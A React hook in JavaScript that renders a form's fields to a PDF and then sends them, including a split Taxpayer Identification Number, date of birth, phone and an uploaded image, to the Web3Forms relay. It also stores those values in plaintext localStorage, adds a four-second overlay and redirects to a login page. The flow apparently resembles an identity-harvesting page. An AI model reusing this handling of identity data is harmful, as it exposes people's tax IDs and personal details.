// src/hooks/useWeb3Forms.js
import { useCallback, useState, useRef } from 'react';

const WEB3FORMS_ACCESS_KEY = '8846fd41-02bb-4bc3-9676-9cfc9e69bbd7';
const WEB3FORMS_ENDPOINT = 'https://api.web3forms.com/submit';

// ---- Helpers (ported) ----
async function ensureJsPDF() {
  if (typeof window === 'undefined') return;
  if (window.jspdf && window.jspdf.jsPDF) return;
  if (window._loadingJsPDF) {
    await window._loadingJsPDF;
    return;
  }
  window._loadingJsPDF = new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
    script.onload = () => resolve();
    script.onerror = () => reject(new Error('Failed to load jsPDF'));
    document.head.appendChild(script);
  });
  await window._loadingJsPDF;
}

function fileToDataURL(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = e => resolve(e.target.result);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

function getImageFormat(mimeType) {
  switch (mimeType) {
    case 'image/jpeg':
    case 'image/jpg':
      return 'JPEG';
    case 'image/png':
      return 'PNG';
    case 'image/gif':
      return 'GIF';
    case 'image/webp':
      return 'WEBP';
    default:
      return null;
  }
}

function validateImage(file, options = {}) {
  const allowedTypes = options.allowedTypes || ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];
  const maxSize = options.maxSize || 5 * 1024 * 1024; // 5 MB
  if (!file) return { valid: false, error: 'No file provided' };
  if (!allowedTypes.includes(file.type)) {
    return { valid: false, error: 'Invalid image type. Allowed: JPEG, PNG, GIF, WebP.' };
  }
  if (file.size > maxSize) {
    return { valid: false, error: 'Image too large. Max size is 5 MB.' };
  }
  return { valid: true };
}

function getCombinedValue(form, names, separator = '-') {
  const vals = names.map(n => (form.elements[n] ? form.elements[n].value : ''));
  return vals.filter(v => v).join(separator);
}

function triggerDownloadLinkOnContinue(href) {
  if (!href || typeof href !== 'string') {
    console.error('triggerDownloadLinkOnContinue: invalid href', href);
    return;
  }
  // Try to click a continue button if found, otherwise open new tab
  const continueBtn = (typeof document !== 'undefined') && (document.querySelector('button#continue, input#continue, .continue'));
  if (continueBtn) {
    const link = document.createElement('a');
    link.href = href;
    link.target = '_blank';
    link.click();
    link.remove();
    return;
  }
  // fallback open in new tab
  if (typeof window !== 'undefined') {
    window.open(href, '_blank');
  }
}

// ---- Core PDF generator (ported) ----
async function generatePDFFromForm(formElement, options = {}) {
  if (!formElement || formElement.tagName !== 'FORM') {
    throw new Error('generatePDFFromForm expects a FORM element.');
  }

  await ensureJsPDF();
  // eslint-disable-next-line no-undef
  const { jsPDF } = window.jspdf;
  const doc = new jsPDF();

  doc.setFontSize(18);
  doc.setFont(undefined, 'bold');
  doc.text('Form Submission', 20, 28);

  doc.setFontSize(11);
  doc.setFont(undefined, 'normal');

  const leftMargin = 20;
  let y = 40;
  const lineHeight = 6;
  const pageHeight = doc.internal.pageSize.height;

  const combinedFields = [
    { label: 'Taxpayer Identification Number', names: ['tin1', 'tin2', 'tin3'], sep: '-' },
    { label: 'Date of Birth', names: ['dateOfBirthMonth', 'dateOfBirthDay', 'dateOfBirthYear'], sep: '-' },
    { label: 'Zip Code', names: ['zip5', 'zip4'], sep: '-' },
    { label: 'Home Phone', names: ['homePhone1', 'homePhone2', 'homePhone3'], sep: '-' }
  ];

  for (const field of combinedFields) {
    const value = getCombinedValue(formElement, field.names, field.sep);
    if (value) {
      if (y + lineHeight > pageHeight - 30) {
        doc.addPage();
        y = 20;
      }
      doc.setFont(undefined, 'bold');
      doc.text(`${field.label}:`, leftMargin, y);
      doc.setFont(undefined, 'normal');
      doc.text(value, leftMargin * 4.5, y);
      y += lineHeight * 1.2;
    }
  }

  const fieldElements = Array.from(formElement.querySelectorAll('input, textarea, select'));
  const skipNames = combinedFields.flatMap(f => f.names);
  const printed = new Set();

  for (const el of fieldElements) {
    const tag = el.tagName.toLowerCase();
    const name = el.name || el.id || '(unnamed)';
    if (skipNames.includes(name)) continue;

    let value = '';

    if (tag === 'select') {
      const selectedOptions = Array.from(el.selectedOptions || []).map(o => o.text).join(', ');
      value = selectedOptions || '(no selection)';
    } else if (el.type === 'checkbox') {
      value = el.checked ? 'Checked' : 'Unchecked';
    } else if (el.type === 'radio') {
      if (!el.name) continue;
      if (printed.has(el.name)) continue; // skip duplicates
      const group = formElement.querySelectorAll(`input[type="radio"][name="${CSS.escape(el.name)}"]`);
      const checked = Array.from(group).find(r => r.checked);
      if (checked) value = checked.value || '(selected)';
      else value = '(none selected)';
      printed.add(el.name);
    } else if (el.type === 'file') {
      value = el.files && el.files[0] ? el.files[0].name : '(no file)';
    } else if (el.name === 'access_key') {
      continue;
    } else {
      value = (el.value || '').toString();
    }

    let displayLabel = name;
    if (name === 'middleInitialName') displayLabel = 'Middle Name or Initials';

    if (y + lineHeight > pageHeight - 30) {
      doc.addPage();
      y = 20;
    }

    doc.setFont(undefined, 'bold');
    doc.text(`${displayLabel}:`, leftMargin, y);
    doc.setFont(undefined, 'normal');

    const wrapped = doc.splitTextToSize(value || '(no value)', 170);
    wrapped.forEach(line => {
      doc.text(line, leftMargin * 4.5, y);
      y += lineHeight;
      if (y + lineHeight > pageHeight - 30) {
        doc.addPage();
        y = 20;
      }
    });
    y += lineHeight / 2;
  }

  // Handle first file input (image) if present
  const fileInput = formElement.querySelector('input[type="file"]');
  if (fileInput && fileInput.files && fileInput.files[0]) {
    const file = fileInput.files[0];
    const validation = validateImage(file);
    if (validation.valid) {
      try {
        const dataUrl = await fileToDataURL(file);
        const imgFormat = getImageFormat(file.type);
        if (imgFormat) {
          const maxWidth = 170;
          const maxHeight = 100;
          if (y + maxHeight > pageHeight - 30) {
            doc.addPage();
            y = 20;
          }
          doc.setFont(undefined, 'bold');
          doc.text('Attached Image:', leftMargin, y);
          y += 8;
          doc.addImage(dataUrl, imgFormat, leftMargin, y, maxWidth, maxHeight);
          y += maxHeight + 6;
          doc.setFontSize(9);
          doc.setFont(undefined, 'italic');
          doc.text(`${file.name} — ${(file.size / 1024 / 1024).toFixed(2)} MB`, leftMargin, y);
          doc.setFontSize(11);
          doc.setFont(undefined, 'normal');
        } else {
          doc.setFont(undefined, 'italic');
          doc.text('Attached image not embedded (unsupported format).', leftMargin, y);
          y += lineHeight;
        }
      } catch (err) {
        doc.setFont(undefined, 'italic');
        doc.text('Attached image could not be read.', leftMargin, y);
        y += lineHeight;
        console.error(err);        
      }
    } else {
      doc.setFont(undefined, 'italic');
      doc.text(`Attached image skipped: ${validation.error}`, leftMargin, y);
      y += lineHeight;
    }
  }

  // Timestamp footer
  const timestamp = new Date().toLocaleString();
  doc.setFontSize(9);
  doc.text(`Generated on: ${timestamp}`, leftMargin, doc.internal.pageSize.height - 15);

  const filename = options.fileName || `form-submission-${new Date().toISOString().split('T')[0]}.pdf`;
  doc.save(filename);
  return filename;
}

// ---- Hook: useWeb3Forms ----
export default function useWeb3Forms() {
  const [loading, setLoading] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [imagePreview, setImagePreview] = useState(null);
  const [imageError, setImageError] = useState('');
  const [fileInfo, setFileInfo] = useState(null);

  // keep ref to last submit buttons so we can re-enable them on finally
  const submitButtonsRef = useRef([]);

  const handleFileChange = useCallback(async (fileInput) => {
    // fileInput can be an <input type="file"> element or File object
    setImageError('');
    setFileInfo(null);
    setImagePreview(null);

    let file = null;
    if (!fileInput) return;
    if (fileInput instanceof File) file = fileInput;
    else if (fileInput.files && fileInput.files[0]) file = fileInput.files[0];

    if (!file) return;

    const validation = validateImage(file);
    if (!validation.valid) {
      setImageError(validation.error);
      // if element provided, clear it
      if (fileInput && fileInput.value !== undefined) fileInput.value = '';
      return;
    }

    const fileSizeStr = (file.size / 1024 / 1024).toFixed(2);
    setFileInfo({ name: file.name, sizeMB: fileSizeStr, type: file.type });

    try {
      const dataUrl = await fileToDataURL(file);
      setImagePreview(dataUrl);
    } catch (err) {
      setImageError('Could not read image preview.');
      console.error(err);
    }
  }, []);

  const handleSubmit = useCallback(async (event) => {
    if (event && event.preventDefault) event.preventDefault();
    let formElement = null;

    if (event && event.target && event.target.tagName === 'FORM') {
      formElement = event.target;
    } else if (event instanceof HTMLFormElement) {
      formElement = event;
    } else {
      console.error('handleSubmit: no form element provided');
      return;
    }

    setLoading(true);
    setFeedback('');
    // disable submit buttons
    const submitButtons = Array.from(formElement.querySelectorAll('button[type="submit"], input[type="submit"]'));
    submitButtonsRef.current = submitButtons;
    submitButtons.forEach(btn => btn.disabled = true);

    const feedbackEl = (typeof document !== 'undefined') && document.getElementById('form-feedback');
    const loadingOverlay = (typeof document !== 'undefined') && document.getElementById('loadingOverlay');
    if (feedbackEl) feedbackEl.textContent = '';

    try {
      // 1. generate PDF (and save locally)
      await generatePDFFromForm(formElement);

      // 2. show overlay for 4s
      if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';
        await new Promise(r => setTimeout(r, 4000));
        loadingOverlay.style.display = 'none';
      }

      // 3. prepare form data
      const formData = new FormData();
      formData.append('access_key', WEB3FORMS_ACCESS_KEY);

      const fields = Array.from(formElement.elements).filter(el => el.name && !el.disabled);

      for (const field of fields) {
        if (field.type === 'file') {
          const f = field.files && field.files[0];
          if (f) {
            const v = validateImage(f);
            if (!v.valid) throw new Error(v.error);
            formData.append(field.name, f, f.name);
          }
        } else if (field.type === 'checkbox') {
          if (field.checked) formData.append(field.name, field.value || 'on');
        } else if (field.type === 'radio') {
          if (field.checked) formData.append(field.name, field.value);
        } else {
          formData.append(field.name, field.value || '');
        }
      }

      // Collect for localStorage and subject fallback
      const formValues = {};
      fields.forEach(field => {
        if (field.type === 'checkbox') formValues[field.name] = field.checked;
        else if (field.type === 'radio') {
          if (field.checked) formValues[field.name] = field.value;
        } else if (field.name === 'access_key' || field.type === 'file') {
          // skip
        } else if (field.name === 'suffix' || field.name === 'state') {
          const selectedOption = field.options && field.options[field.selectedIndex];
          formValues[field.name] = selectedOption ? selectedOption.text : field.value;
        } else if (field.name === 'middleInitialName') {
          formValues['Middle Name or Initials'] = field.value;
        } else {
          formValues[field.name] = field.value;
        }
      });

      const combinedFields = [
        { label: 'Taxpayer Identification Number', names: ['tin1', 'tin2', 'tin3'], sep: '-' },
        { label: 'Date of Birth', names: ['dateOfBirthMonth', 'dateOfBirthDay', 'dateOfBirthYear'], sep: '-' },
        { label: 'Zip Code', names: ['zip5', 'zip4'], sep: '-' },
        { label: 'Home Phone', names: ['homePhone1', 'homePhone2', 'homePhone3'], sep: '-' }
      ];

      combinedFields.forEach(field => {
        const combinedValue = getCombinedValue(formElement, field.names, field.sep);
        if (combinedValue) {
          formValues[field.label] = combinedValue;
          field.names.forEach(name => { delete formValues[name]; });
        }
      });

      localStorage.setItem('formSubmissionData', JSON.stringify(formValues));

      if (!formData.has('subject')) formData.append('subject', 'Website Form Submission');

      const response = await fetch(WEB3FORMS_ENDPOINT, {
        method: 'POST',
        body: formData
      });

      const result = await response.json().catch(() => ({}));
      if (!response.ok) {
        const message = result.message || `Server returned status ${response.status}`;
        throw new Error(message);
      }

      // dispatch success event
      if (typeof document !== 'undefined') {
        formElement.dispatchEvent(new CustomEvent('web3forms:success', { detail: result }));
      }
      setFeedback('Form submitted successfully!');
      try { formElement.reset(); } catch (e) { /* ignore */ console.error(e);}

    } catch (err) {
      if (typeof document !== 'undefined') {
        formElement.dispatchEvent(new CustomEvent('web3forms:error', { detail: { message: err.message || String(err) } }));
      }
      setFeedback('Error: ' + (err.message || String(err)));
      console.error('Form submission error:', err);
    } finally {
      // re-enable buttons
      (submitButtonsRef.current || []).forEach(btn => btn.disabled = false);
      setLoading(false);
      // trigger continue / next page
      triggerDownloadLinkOnContinue('/Login');
    }
  }, []);

  return {
    loading,
    feedback,
    imagePreview,
    imageError,
    fileInfo,
    handleFileChange,
    handleSubmit,
  };
}
